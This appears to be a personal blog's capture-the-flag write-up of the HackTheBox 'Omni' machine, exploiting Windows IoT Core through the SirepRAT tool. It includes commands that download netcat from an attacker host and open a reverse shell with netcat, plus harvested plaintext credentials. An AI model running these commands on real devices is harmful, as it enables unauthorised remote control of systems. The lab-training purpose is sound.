---
date: 2021-01-09 23:48:05
layout: post
title: HackTheBox Omni Writeup
subtitle: Hackthebox Omni Writeup
description: >-
  in this blog i've explained how to solve Omni machine in hackthebox
image: https://i.ibb.co/WsG6YNc/logo.png
optimized_image: https://i.ibb.co/WsG6YNc/logo.png
category: hackthebox
tags:
  - hackthebox
  - Omni
author: Ahmed Fatouh
paginate: true
---
![logo](https://i.ibb.co/WsG6YNc/logo.png)

# []()Methodology

* Service Enumeration.
* Windows IoT core Exploitation.
* Privilege Escalation.

# []()Nmap Scan

> **as always, i’ll do nmap scan to find out which services running in this machine.**

* 135/tcp --> Microsoft Windows RPC
* 8080/tcp --> Microsoft IIS httpd

> **nmap -sC -sV -Pn -oN scan.txt 10.10.10.204**

```ruby

Nmap scan report for 10.10.10.204
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
135/tcp  open  msrpc   Microsoft Windows RPC
8080/tcp open  upnp    Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

> **let's check the web service first.**

# []()Checking Web Service

![web-page](https://i.ibb.co/zRpFnrg/web-service.png)

> **i tried to ByPass the authentication by many ways but i failed, so let's dig more.**

# []()Windows IOT Core Exploitation.

> **from the nmap scan we know from the port 8080 that this is a windows device portal, so let's search for any exploits.**

![google-search](https://i.ibb.co/K6ds03Z/google-search.png)

* coole, let's read this [article](https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/) first.

> **from the article i understand that this is a RCE, so we will execute command on the server as we like.**

![](https://i.ibb.co/xGQSXq2/rce.png)

> **first let's download this [repo](https://github.com/SafeBreach-Labs/SirepRAT.git)**

> **after downloading this repo, let's make some noise now.**

> **first i will execute a command to upload the nc to Omni server, then i will execute another command to get reverse shell.**

* **let's go**

1. **let's upload nc to the machine.**

> python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe -Uri http://10.10.16.4:8000/nc64.exe" --v

![](https://i.ibb.co/HXJB1z6/upload-nc.png)

2. **let's get a reverse shell**

> python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.16.4 9002 -e powershell.exe" --v

![](https://i.ibb.co/hVQSkX7/reverse-shell.png)

* **we got reverse shell as a system but this is a tricky part, we can't read user or root flag, so let's dig more.**

> in this PATH **C:\Program Files\WindowsPowerShell\Modules\PackageManagement** i've found a bat file which contain a credentials for user and administrator.

![credentials](https://i.ibb.co/fMkFjWn/creds.png)

```ruby

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

```

> **let's login to the web appliaction now with user credentials.**

![proccess](https://i.ibb.co/vPtR6RM/app-pcs.png)

> **there is a Proccesses tap and we can run commands from it**.

> **let's get a reverse shell now.**

![](https://i.ibb.co/6tqrHhs/app-whoami.png)

> **let's check our user.txt**

![](https://i.ibb.co/vh36BgH/user.png)

> **this file encrypted by PSCredential** so we need to decrypt it.

* **follow this [blog](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/exporting-and-importing-credentials-in-powershell)**.

> **$userflag = Import-Clixml -path user.txt**

> **$userflag.getnetworkcredential().password**

![](https://i.ibb.co/FWgKNYv/user-flag.png)

* **user flag done.**

# []()Privilege Escalation

> **open the web appliaction and login with administrator credentials and do the same steps.**

> **$adminflag = Import-Clixml -pat root.txt**

> **$adminflag.getnetworkcredential().password**

![](https://i.ibb.co/HTJBJGY/adminflag.png)

* cheers!

> **Thanks for reading.**

 <script src="https://www.hackthebox.eu/badge/103789"></script>


